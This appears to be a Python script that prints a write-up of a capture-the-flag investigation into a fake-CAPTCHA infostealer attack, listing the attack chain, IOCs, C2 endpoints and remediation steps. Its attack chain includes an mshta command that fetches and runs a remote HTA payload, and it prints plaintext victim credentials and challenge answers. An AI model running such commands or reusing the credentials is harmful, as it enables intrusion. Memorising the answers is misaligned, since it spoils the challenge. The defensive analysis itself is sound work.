"""
Stealer's Shadow - Attack Chain Analysis Script
================================================
Author: MR. Umair
Date: October 15, 2025
Purpose: Analyze and visualize the attack chain from the investigation
"""

def print_banner():
    """Print investigation banner"""
    print("=" * 70)
    print(" " * 15 + "STEALER'S SHADOW INVESTIGATION")
    print(" " * 10 + "Data Exfiltration Incident Analysis")
    print("=" * 70)
    print()

def display_attack_summary():
    """Display attack summary"""
    print("[+] ATTACK SUMMARY")
    print("-" * 70)
    print("Target Organization: The Etherians (Megacorp One)")
    print("Compromised System: WK001.megacorpone.com")
    print("Compromised User: a.smith@megacorpone.com")
    print("Attack Date: August 5, 2025")
    print("Attack Duration: ~26 minutes (08:35:42 - 09:02:07 UTC)")
    print()

def display_exfiltrated_data():
    """Display information about exfiltrated data"""
    print("[+] EXFILTRATED DATA")
    print("-" * 70)
    print("File: 101010245WK001_protected.zip")
    print("SHA-256: 0324d54bc6c0f2dfa54b32bc68c16fd401778c10a9e9780b9cda0f31ae960d9c")
    print()
    print("Malware Used: captcha_privacy[1].epub")
    print("SHA-256: a88fedc93a1d80c8cea08fbcb6b001293ddf357e27d268b32c5cfd23a49e96ed")
    print()
    print("Encryption: WinZip AE-2 (AES-256)")
    print("Password: cc9441e5-1c80-4287-9c7a-4c03215c0969WK001")
    print("Password Formula: <Machine GUID><Hostname>")
    print()

def display_attack_chain():
    """Display complete attack chain"""
    print("[+] ATTACK CHAIN")
    print("-" * 70)
    
    stages = [
        ("1. Phishing Email", "billing@zaffrevelox.com → a.smith@megacorpone.com", "99.91.94.11"),
        ("2. Redirect", "http://www.zaffrevelox.com → https://pfusioncaptcha.com", "Redirection"),
        ("3. Fake CAPTCHA", "Social engineering to execute clipboard content", "User interaction"),
        ("4. Blockchain Payload", "Smart contract retrieval via RPC", "31.17.87.96:8545"),
        ("5. HTA Execution", "mshta.exe http://pfusioncaptcha.com/13221442.hta", "User executed"),
        ("6. LOLBin Download", "IMEWDBLD.EXE downloads malware", "news.axonbyte.org (145.1.0.92)"),
        ("7. Registry Hijack", ".epub → exefile association", "Persistence established"),
        ("8. Malware Execution", "captcha_privacy[1].epub runs", "PID 17852"),
        ("9. C2 Communication", "Beaconing to attacker infrastructure", "145.1.0.92:443"),
        ("10. Data Exfiltration", "Encrypted archive uploaded", "145.1.0.92:443/send_message"),
    ]
    
    for i, (stage, description, indicator) in enumerate(stages, 1):
        print(f"\n{stage}")
        print(f"   Description: {description}")
        print(f"   Indicator: {indicator}")
    
    print()

def display_iocs():
    """Display Indicators of Compromise"""
    print("[+] INDICATORS OF COMPROMISE (IOCs)")
    print("-" * 70)
    
    print("\nIP Addresses:")
    ips = [
        ("99.91.94.11", "Phishing email infrastructure"),
        ("31.17.87.96", "Blockchain RPC endpoint (port 8545)"),
        ("145.1.0.92", "C2 server and malware hosting"),
    ]
    for ip, desc in ips:
        print(f"  • {ip:<15} - {desc}")
    
    print("\nDomains/URLs:")
    urls = [
        "www.zaffrevelox.com",
        "pfusioncaptcha.com",
        "pfusioncaptcha.com/13221442.hta",
        "news.axonbyte.org",
        "news.axonbyte.org:8000/captcha_privacy.epub",
    ]
    for url in urls:
        print(f"  • {url}")
    
    print("\nFile Hashes (SHA-256):")
    hashes = [
        ("a88fedc93a1d80c8cea08fbcb6b001293ddf357e27d268b32c5cfd23a49e96ed", "captcha_privacy[1].epub"),
        ("0324d54bc6c0f2dfa54b32bc68c16fd401778c10a9e9780b9cda0f31ae960d9c", "101010245WK001_protected.zip"),
    ]
    for hash_val, filename in hashes:
        print(f"  • {hash_val}")
        print(f"    {filename}")
    
    print("\nBlockchain:")
    print("  • Contract: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512")
    print("  • RPC Server: http://31.17.87.96:8545/")
    print()

def display_c2_endpoints():
    """Display C2 endpoints"""
    print("[+] C2 ENDPOINTS")
    print("-" * 70)
    
    endpoints = [
        ("/life", "Heartbeat / status beacon"),
        ("/send_message", "Data exfiltration endpoint"),
        ("/receive_message", "Command & control pull"),
        ("/feed", "Covert RSS/Atom channel for config/ops"),
    ]
    
    print(f"\nC2 Server: 145.1.0.92 (news.axonbyte.org)\n")
    for endpoint, description in endpoints:
        print(f"  {endpoint}")
        print(f"    → {description}")
        print()

def display_compromised_credentials():
    """Display compromised credentials"""
    print("[+] COMPROMISED CREDENTIALS")
    print("-" * 70)
    
    credentials = [
        {
            "origin": "https://portal.azure.com/",
            "username": "a.smith@megacorpone.com",
            "password": "ADG135QET246!v!",
            "risk": "CRITICAL - Azure Portal Access"
        },
        {
            "origin": "https://accounts.google.com/",
            "username": "a.smith@megacorpone.com",
            "password": "ADG135QET246!v!",
            "risk": "CRITICAL - Google Workspace Access"
        }
    ]
    
    for i, cred in enumerate(credentials, 1):
        print(f"\nCredential Set {i}:")
        print(f"  Origin: {cred['origin']}")
        print(f"  Username: {cred['username']}")
        print(f"  Password: {cred['password']}")
        print(f"  Risk Level: {cred['risk']}")
    
    print()

def display_recommendations():
    """Display security recommendations"""
    print("[+] IMMEDIATE ACTIONS REQUIRED")
    print("-" * 70)
    
    actions = [
        "✓ Isolate WK001.megacorpone.com from network",
        "✓ Reset credentials for a.smith@megacorpone.com",
        "✓ Enable MFA on Azure and Google accounts",
        "✓ Block attacker IPs at perimeter firewall",
        "✓ Hunt for .epub files in INetCache across network",
        "✓ Block IMEWDBLD.EXE usage via AppLocker",
        "✓ Monitor registry modifications to file associations",
        "✓ Conduct fake CAPTCHA awareness training",
    ]
    
    for action in actions:
        print(f"  {action}")
    
    print()

def display_attack_techniques():
    """Display novel attack techniques"""
    print("[+] NOVEL ATTACK TECHNIQUES")
    print("-" * 70)
    
    techniques = [
        ("Blockchain Payload Delivery", 
         "Used smart contract to store and deliver malicious commands,\n" +
         "  evading traditional web filtering and takedown attempts"),
        
        ("Fake CAPTCHA Social Engineering",
         "Leveraged user trust in CAPTCHA systems to trick victims\n" +
         "  into executing malicious commands via clipboard"),
        
        ("LOLBin Chaining",
         "mshta.exe → IMEWDBLD.EXE chain using only Microsoft-signed\n" +
         "  binaries to evade detection"),
        
        ("Registry File Association Hijack",
         ".epub files associated with exefile type for stealthy\n" +
         "  malware execution"),
    ]
    
    for technique, description in techniques:
        print(f"\n{technique}:")
        print(f"  {description}")
    
    print()

def main():
    """Main function"""
    print_banner()
    display_attack_summary()
    display_exfiltrated_data()
    display_attack_chain()
    display_iocs()
    display_c2_endpoints()
    display_compromised_credentials()
    display_attack_techniques()
    display_recommendations()
    
    print("=" * 70)
    print(" " * 20 + "INVESTIGATION COMPLETE")
    print(" " * 10 + "All 7 questions answered successfully")
    print("=" * 70)
    print()
    print("Report Location: INVESTIGATION_REPORT.md")
    print("Challenge Status: ✓ COMPLETED")
    print()

if __name__ == "__main__":
    main()
